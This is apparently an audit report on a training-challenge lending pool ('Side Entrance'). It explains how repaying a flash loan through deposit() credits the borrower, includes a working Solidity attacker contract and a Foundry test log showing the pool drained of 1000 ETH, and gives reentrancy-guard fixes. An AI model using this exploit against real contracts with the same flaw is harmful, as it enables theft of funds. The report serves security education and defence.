## High

### [H-1] Repaying the flash loan through `deposit()` credits the borrower and lets them drain the pool (theft of funds)

**Description:**

The pool hold all ETH in one account, the contract balance, but it use that single balance for two different jobs, the flash loan repayment check and the per user deposit accounting.

The flash loan only check the raw contract balance at the end:

```solidity
// src/side-entrance/SideEntranceLenderPool.sol:35-43
function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;

    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
    if (address(this).balance < balanceBefore) {
        revert RepayFailed();
    }
}
```

The check is only `address(this).balance < balanceBefore`. It does not care how the ETH came back, only that the total is whole again.

The `deposit()` function let anyone send ETH into the pool and it credit that ETH to the sender inside `balances`:

```solidity
// src/side-entrance/SideEntranceLenderPool.sol:19-24
function deposit() external payable {
    unchecked {
        balances[msg.sender] += msg.value;
    }
    emit Deposit(msg.sender, msg.value);
}
```

These two pieces fit together in a bad way. During the loan callback, the borrower can take the borrowed ETH and call `deposit()` with it. That send the ETH back to the pool, so the contract balance is restored and the `RepayFailed` check pass. But at the same time `deposit()` writes a credit into `balances[borrower]` equal to the borrowed amount. The borrower has paid back the loan and *also* gained a withdrawable balance for the exact same ETH.

After the loan return, the attacker just call `withdraw()`:

```solidity
// src/side-entrance/SideEntranceLenderPool.sol:26-33
function withdraw() external {
    uint256 amount = balances[msg.sender];

    delete balances[msg.sender];
    emit Withdraw(msg.sender, amount);

    SafeTransferLib.safeTransferETH(msg.sender, amount);
}
```

This send all 1000 ETH out of the pool to the attacker, who then forward it to the recovery account. The pool is fully drained.

**Impact:**

Likelihood is High. The attack need no special permission, it cost only gas, and it is done in a single transaction by anyone.

Risk is also High. It steal all the ETH that is held in the pool, so this is a full theft of funds. Overall severity is High.

**Proof of Concept:**

The attacker deploy a small contract. The contract borrow the whole pool balance, and inside the `execute()` callback it deposit that ETH back into the pool. The deposit restore the pool balance (so the loan pass) and credit the attacker contract with 1000 ETH. After the loan, the contract call `withdraw()` to pull the 1000 ETH out, and forward it to the recovery account.

```solidity
contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool private immutable pool;
    address private immutable recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    // Step 1: borrow everything, then deposit the borrowed ETH right back.
    function attack() external {
        uint256 amount = address(pool).balance;
        pool.flashLoan(amount);
        // Step 3: pull our (credited) deposit out, then forward it to recovery.
        pool.withdraw();
        (bool ok,) = recovery.call{value: address(this).balance}("");
        require(ok, "send failed");
    }

    // Step 2: the pool calls us in the middle of the loan. We deposit the
    // borrowed ETH back, which restores the pool balance but credits us.
    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}

function test_sideEntrance() public {
    console.log("BEFORE ATTACK");
    console.log("pool balance     :", address(pool).balance);
    console.log("recovery balance :", recovery.balance);
    console.log("player balance   :", player.balance);

    vm.startPrank(player, player);
    SideEntranceAttacker attacker = new SideEntranceAttacker(pool, recovery);
    attacker.attack();
    vm.stopPrank();

    console.log("AFTER ATTACK");
    console.log("pool balance     :", address(pool).balance);
    console.log("recovery balance :", recovery.balance);

    assertEq(address(pool).balance, 0, "Pool still has ETH");
    assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
}
```

Console output from `forge test --match-path test/side-entrance/SideEntrancePoC.t.sol -vv`:

```
Ran 1 test for test/side-entrance/SideEntrancePoC.t.sol:SideEntrancePoC
[PASS] test_sideEntrance() (gas: 247362)
Logs:
  BEFORE ATTACK
  pool balance     : 1000000000000000000000
  recovery balance : 0
  player balance   : 1000000000000000000
  AFTER ATTACK
  pool balance     : 0
  recovery balance : 1000000000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped
```

The numbers show the drain clearly. The pool start with 1000 ETH and end with 0, and the recovery account end with the full 1000 ETH, all funded by the pool own ETH.

**Recommended Mitigation:**

The root problem is that the flash loan trust a raw balance check that the borrower can satisfy with the pool own deposit path. Fix the accounting so the loan repayment cannot also count as a deposit.

The cleanest fix is to track the total deposited ETH in its own variable and require the flash loan to be repaid through a dedicated path, not through `deposit()`. A simple and effective version is to add a reentrancy guard so the loan callback cannot re enter the pool state functions.

File: `src/side-entrance/SideEntranceLenderPool.sol`:

```diff
+import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

-contract SideEntranceLenderPool {
+contract SideEntranceLenderPool is ReentrancyGuard {
     mapping(address => uint256) public balances;

-    function deposit() external payable {
+    function deposit() external payable nonReentrant {
         unchecked {
             balances[msg.sender] += msg.value;
         }
         emit Deposit(msg.sender, msg.value);
     }

-    function withdraw() external {
+    function withdraw() external nonReentrant {
         uint256 amount = balances[msg.sender];

         delete balances[msg.sender];
         emit Withdraw(msg.sender, amount);

         SafeTransferLib.safeTransferETH(msg.sender, amount);
     }

-    function flashLoan(uint256 amount) external {
+    function flashLoan(uint256 amount) external nonReentrant {
         uint256 balanceBefore = address(this).balance;

         IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
         if (address(this).balance < balanceBefore) {
             revert RepayFailed();
         }
     }
```

With a shared `nonReentrant` guard, the borrower can no longer call `deposit()` from inside the loan callback, so they cannot mint themselves a free withdrawable balance. For a fully correct design, the pool should also separate the flash loan liquidity from the user deposit accounting, so the two ETH pools are never mixed.

***

## Low

### [L-1] `flashLoan()` does no input validation and force the receiver to be `msg.sender`

**Description:**

```solidity
// src/side-entrance/SideEntranceLenderPool.sol:35-43
function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;

    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
    if (address(this).balance < balanceBefore) {
        revert RepayFailed();
    }
}
```

`flashLoan()` has two minor issues: First it does not validate amount, so zero values are accepted and overly large values revert with a low level error instead of a clear custom revert. And the loan is always sent to `msg.sender` and requires it to implement `IFlashLoanEtherReceiver`, meaning only contracts can use it and the receiver cannot be chosen separately. This limits flexibility and makes the function harder to integrate, though it is mainly a design constraint rather than a security issue.

**Impact:**

Likelihood Low. Risk Low, mostly poor error reporting and a rigid interface, no direct loss of funds from this issue alone.

**Proof of Concept:**

N/A

**Recommended Mitigation:**

Add a clear check on `amount` and revert with a named error when it is zero or larger than the available balance.

File: `src/side-entrance/SideEntranceLenderPool.sol`, function `flashLoan()`:

```diff
+    error InvalidAmount();
+
     function flashLoan(uint256 amount) external {
+        if (amount == 0 || amount > address(this).balance) revert InvalidAmount();
         uint256 balanceBefore = address(this).balance;

         IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
         if (address(this).balance < balanceBefore) {
             revert RepayFailed();
         }
     }
```

## Informational

### [I-1] `deposit()` uses an `unchecked` block for balance accounting

**Description:**

```solidity
// src/side-entrance/SideEntranceLenderPool.sol:19-24
function deposit() external payable {
    unchecked {
        balances[msg.sender] += msg.value;
    }
    emit Deposit(msg.sender, msg.value);
}
```

**Impact:**

Info

**Proof of Concept:**

N/A

**Recommended Mitigation:**

Drop the `unchecked` block and let the default checked addition protect the balance accounting.

File: `src/side-entrance/SideEntranceLenderPool.sol`, function `deposit()`:

```diff
     function deposit() external payable {
-        unchecked {
-            balances[msg.sender] += msg.value;
-        }
+        balances[msg.sender] += msg.value;
         emit Deposit(msg.sender, msg.value);
     }
```
